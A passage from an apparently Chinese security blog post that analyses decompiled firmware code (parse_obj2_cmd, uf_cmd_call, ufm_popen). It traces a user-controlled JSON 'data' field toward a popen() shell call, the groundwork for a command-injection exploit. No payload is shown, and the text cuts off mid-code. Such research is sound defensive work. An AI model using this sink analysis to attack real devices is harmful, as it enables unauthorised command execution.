class="line">        uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)cmd_msg-&gt;ip:%s&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">333</span>, v14);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_128:</span><br><span class="line">    uf_log_printf(uf_client_log, <span class="string">&quot;(%s %s %d)strdup failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_129;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_28:</span><br><span class="line">  *(_DWORD *)ptr_2 = <span class="number">5</span>;</span><br><span class="line">  *(_DWORD *)(ptr_2 + <span class="number">4</span>) = strdup(<span class="string">&quot;get&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)cmd_msg-&gt;ctype:%d&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">339</span>, <span class="number">5</span>);</span><br><span class="line">LABEL_59:</span><br><span class="line">  v24 = *(_DWORD *)ptr_2 != <span class="number">2</span>;</span><br><span class="line">  *(_BYTE *)(ptr_2 + <span class="number">40</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_BYTE *)(ptr_2 + <span class="number">41</span>) = v24;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;async&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v26 = v25;</span><br><span class="line">    <span class="keyword">if</span> ( v25 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v25 == <span class="number">48</span> || !<span class="built_in">strcmp</span>(v25, <span class="string">&quot;false&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">40</span>) = <span class="number">1</span>;</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">41</span>) = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *v26 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v26, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_WORD *)(ptr_2 + <span class="number">40</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v26);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;force&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v27 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v28 = v27;</span><br><span class="line">    <span class="keyword">if</span> ( v27 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v27 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v27, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">43</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v28);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;configId_not_change&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v29 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v30 = v29;</span><br><span class="line">    <span class="keyword">if</span> ( v29 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v29 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v29, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">44</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v30);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)----------configId_not_change:%d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;parse_obj2_cmd&quot;</span>,</span><br><span class="line">        <span class="number">481</span>,</span><br><span class="line">        *(<span class="type">unsigned</span> __int8 *)(ptr_2 + <span class="number">44</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;buf&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">    *(_DWORD *)(ptr_2 + <span class="number">36</span>) = json_object_get_int(params_module);</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;from_url&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v31 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v32 = v31;</span><br><span class="line">    <span class="keyword">if</span> ( v31 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v31 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v31, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">45</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v32);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)----------from_url:%d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;parse_obj2_cmd&quot;</span>,</span><br><span class="line">        <span class="number">500</span>,</span><br><span class="line">        *(<span class="type">unsigned</span> __int8 *)(ptr_2 + <span class="number">45</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;from_file&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v33 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v34 = v33;</span><br><span class="line">    <span class="keyword">if</span> ( v33 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v33 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v33, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">47</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v34);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)----------from_file:%d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;parse_obj2_cmd&quot;</span>,</span><br><span class="line">        <span class="number">513</span>,</span><br><span class="line">        *(<span class="type">unsigned</span> __int8 *)(ptr_2 + <span class="number">47</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;multi&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v35 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v36 = v35;</span><br><span class="line">    <span class="keyword">if</span> ( v35 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v35 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v35, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">48</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v36);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)----------multi:%d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;parse_obj2_cmd&quot;</span>,</span><br><span class="line">        <span class="number">526</span>,</span><br><span class="line">        *(<span class="type">unsigned</span> __int8 *)(ptr_2 + <span class="number">48</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;not_commit&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v37 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v38 = v37;</span><br><span class="line">    <span class="keyword">if</span> ( v37 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v37 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v37, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">46</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v38);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)----------not_commit:%d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;parse_obj2_cmd&quot;</span>,</span><br><span class="line">        <span class="number">538</span>,</span><br><span class="line">        *(<span class="type">unsigned</span> __int8 *)(ptr_2 + <span class="number">46</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;execute&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v39 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v40 = v39;</span><br><span class="line">    <span class="keyword">if</span> ( v39 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v39 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v39, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">42</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v40);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v41 = ptr_2;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;data&quot;</span>, &amp;params_module) == <span class="number">1</span></span><br><span class="line">    &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(json_object_get_type(params_module) - <span class="number">4</span>) &lt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v42 = json_object_get_string(params_module);</span><br><span class="line">    <span class="keyword">if</span> ( v42 )</span><br><span class="line">    &#123;</span><br><span class="line">      v43 = strdup(v42);</span><br><span class="line">      *(_DWORD *)(ptr_2 + <span class="number">12</span>) = v43;</span><br><span class="line">      <span class="keyword">if</span> ( !v43 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v41;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>处理data的部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;data&quot;</span>, &amp;params_module) == <span class="number">1</span></span><br><span class="line">  &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(json_object_get_type(params_module) - <span class="number">4</span>) &lt; <span class="number">3</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v42 = json_object_get_string(params_module);</span><br><span class="line">  <span class="keyword">if</span> ( v42 )</span><br><span class="line">  &#123;</span><br><span class="line">    v43 = strdup(v42);</span><br><span class="line">    *(_DWORD *)(ptr_2 + <span class="number">12</span>) = v43;</span><br><span class="line">    <span class="keyword">if</span> ( !v43 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码从 JSON 对象 <code>params</code> 中提取 “data” 字段，并检查其类型是否为字符串、数组或对象。如果是字符串类型，则复制字符串并将其指针存储在指定的位置。如果内存分配失败，则跳转到错误处理代码。</p>
<blockquote>
<ol>
<li><code>json_type_null</code> (值为 0)</li>
<li><code>json_type_boolean</code> (值为 1)</li>
<li><code>json_type_double</code> (值为 2)</li>
<li><code>json_type_int</code> (值为 3)</li>
<li><code>json_type_object</code> (值为 4)</li>
<li><code>json_type_array</code> (值为 5)</li>
<li><code>json_type_string</code> (值为 6)</li>
</ol>
</blockquote>
<p>这边记住可控字段的偏移12</p>
<p>到了之后有一个<code>uf_cmd_call</code>函数，乍一看感觉有命令执行点，因此跟进，寻找命令执行点</p>
<h5 id="ufm-popen"><a href="#ufm-popen" class="headerlink" title="ufm_popen"></a>ufm_popen</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">ufm_popen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, _DWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">51200</span>]; <span class="comment">// [sp+28h] [-C808h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [sp+C828h] [-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  pthread_mutex_lock(&amp;unk_435F30);</span><br><span class="line">  v4 = popen(a1, <span class="string">&quot;r&quot;</span>);                           <span class="comment">//执行a1指向的shell命令</span></span><br><span class="line">  pthread_mutex_unlock(&amp;unk_435F30);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)cmd[%s] open failed!&quot;</span>, <span class="string">&quot;ufm_common.c&quot;</span>, <span class="string">&quot;ufm_popen&quot;</span>, <span class="number">47</span>, a1);</span><br><span class="line">    v6 = (_DWORD *)_errno_location();</span><br><span class="line">    v5 = (<span class="type">const</span> <span class="type">char</span> *)strerror(*v6);</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)popen failed. %s, with errno %d.&quot;</span>, <span class="string">&quot;ufm_common.c&quot;</span>, <span class="string">&quot;ufm_popen&quot;</span>, <span class="number">48</span>, v5, *v6);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = <span class="number">512</span>;</span><br><span class="line">  v7 = (_BYTE *)<span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line">  *a2 = v7;</span><br><span class="line">  <span class="keyword">if</span> ( !v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)memory full!&quot;</span>, <span class="string">&quot;ufm_common.c&quot;</span>, <span class="string">&quot;ufm_popen&quot;</span>, <span class="number">55</span>);</span><br><span class="line">    pclose(v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *v7 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !feof(v4) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="keyword">sizeof</span>(v10));</span><br><span class="line">    <span class="keyword">if</span> ( fgets(v10, <span class="number">51200</span>, v4) )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_str_append(a2, v10, &amp;v11);</span><br><span class="line">      v9 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">strlen</span>(*a2) &gt;= <span class="number">0x9C4001</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)string oversize!&quot;</span>, <span class="string">&quot;ufm_common.c&quot;</span>, <span class="string">&quot;ufm_popen&quot;</span>, <span class="number">69</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*a2);</span><br><span class="line">    *a2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pthread_mutex_lock(<span class="number">4415280</span>);</span><br><span class="line">  pclose(v4);</span><br><span class="line">  pthread_mutex_unlock(<span class="number">4415280</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是这个函数其实是执行不到的，让我娓娓道来</p>
<h4 id="uf-cmd-call"><a href="#uf-cmd-call" class="headerlink" title="uf_cmd_call"></a>uf_cmd_call</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">uf_cmd_call</span><span class="params">(<span class="type">int</span> addr, <span class="type">int</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line"> .........</span><br><span class="line">  v16 = *(<span class="type">unsigned</span> __int8 *)(addr + <span class="number">45</span>);        <span class="comment">// 没有特别设置就是0</span></span><br><span class="line">  HIBYTE(_20_23_is_data[<span class="number">4</span>]) = v13 != <span class="number">5</span>;</span><br><span class="line">  _20_23_is_data[<span class="number">5</span>] = v15;</span><br><span class="line">  v17 = *(<span class="type">const</span> <span class="type">char</span> **)(addr + <span class="number">8</span>);</span><br><span class="line">  _20_23_is_data[<span class="number">0</span>] = addr;</span><br><span class="line">  _20_23_is_data[<span class="number">14</span>] = (<span class="type">int</span>)v17;</span><br><span class="line">  <span class="keyword">if</span> ( !v16 )               <span class="comment">//这个直接执行</span></span><br><span class="line">  &#123;</span><br><span class="line">    _20_23_is_data[<span class="number">20</span>] = *(_DWORD *)(addr + <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_86;    </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>因此会直接跳到LABEL_86</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br></pre></td><td class="code"><pre><span class="line">LABEL_86:</span><br><span class="line">  addr_20 = *(_DWORD *)(addr + <span 